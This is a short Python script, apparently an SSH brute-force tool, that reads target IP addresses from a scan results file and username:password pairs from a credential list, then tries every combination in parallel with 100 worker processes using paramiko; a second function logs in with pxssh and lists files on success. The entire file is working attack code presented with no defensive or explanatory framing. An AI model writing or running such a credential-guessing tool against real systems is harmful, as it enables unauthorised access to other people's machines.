from pexpect import pxssh
from paramiko import SSHClient
from paramiko.ssh_exception import *
import re
from itertools import product
from multiprocessing import Pool

def test_login(ip, creds):
	try:
		username = creds[0]
		password = creds[1]
		s = pxssh.pxssh()
		if not s.login(ip, username, password):
			print("SSH session failed on login.")
			print(str(s))
		else:
			print("SSH session login successful")
			s.sendline ('ls -l')
			s.prompt()		 # match the prompt
			print(s.before)	 # print everything before the prompt.
			s.logout()
	except:
		print("%s not successful" % ip)

def test_access(ip, creds):

	try:
		ssh = SSHClient()
		username = creds[0]
		password = creds[1]
		# print(ip)
		ssh.connect(ip, username = username, password = password, timeout = .3)
		return True
	except:
		print("%s not successful" % ip)
		return False



if __name__ == "__main__":
	addresses = [re.search(r"\d+\.\d+\.\d+\.\d+", a).group(0) 
		for a in open('ip_scan.txt', 'r').read().split("\n") 
		if re.search(r"\d+\.\d+\.\d+\.\d+", a)
	]

	creds = [s.split(":") for s in open('ssh_pass.txt', 'r').read().split("\n")]#[15:16]
	# print(addresses)
	print(creds)
	combinations = list(product(addresses, creds))
	# print(combinations)
	print(len(combinations))
	# quit()
	# for c in combinations:
		# test_access(c[0], c[1])
	# quit()
	with Pool(100) as pool:
		# print("hej")
		results = pool.starmap(test_access, combinations)
		print(results)

	print(True in results)